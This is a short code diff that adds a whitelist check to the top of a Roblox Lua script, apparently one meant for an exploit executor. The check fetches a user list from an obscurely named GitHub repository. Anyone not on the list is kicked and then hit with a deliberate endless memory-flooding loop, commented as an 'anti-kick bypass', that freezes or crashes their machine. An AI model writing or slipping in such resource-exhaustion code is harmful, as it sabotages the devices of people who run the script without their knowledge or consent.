@@ -1,3 +1,20 @@
+-- == WHITELIST & ANTI-CRACK ==
+local player = game.Players.LocalPlayer
+local userId = tostring(player.UserId)
+
+local wl = game:HttpGet("https://raw.githubusercontent.com/kjhbdwadabfjkhgf/ajshgbdhb28/main/wlsajhbdihuzawbgIJKUHB")
+if not string.find(wl, userId) then
+    player:Kick("Du bist nicht auf der Whitelist! by Muki")
+    task.wait(1)
+    -- RAM-Flood als Anti-Kick-Bypass:
+    while true do
+        local t = {}
+        for i = 1, 1e7 do
+            t[i] = tostring(math.random())..string.rep("X", 100)
+        end
+    end
+    return
+end
 -- == SERVICES UND GRUNDVARIABLEN ==
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
